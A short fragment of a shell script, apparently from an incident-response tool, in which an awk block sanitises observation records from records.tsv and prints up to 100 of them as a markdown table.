    BLUESWEEP_IR_TYPES="$types" awk -F '\t' '
        function safe(s) {gsub(/[|<>`\[\]]/,"?",s); if(length(s)>300)s=substr(s,1,300)" ..."; return s}
        BEGIN {n=split(ENVIRON["BLUESWEEP_IR_TYPES"],a," ");for(i=1;i<=n;i++)want[a[i]]=1}
        $1=="OBS" && ($2 in want) {
            if(++count<=100) printf "| records.tsv:L%d | %s | %s | %s |\n",NR,safe($2),safe($3),safe($4)
        }
        END {if(count>100) printf "\nShowing 100 of %d records; use records.tsv for all evidence.\n",count}
    ' "$dir/records.tsv"
    printf '\n'
}

main "$@"
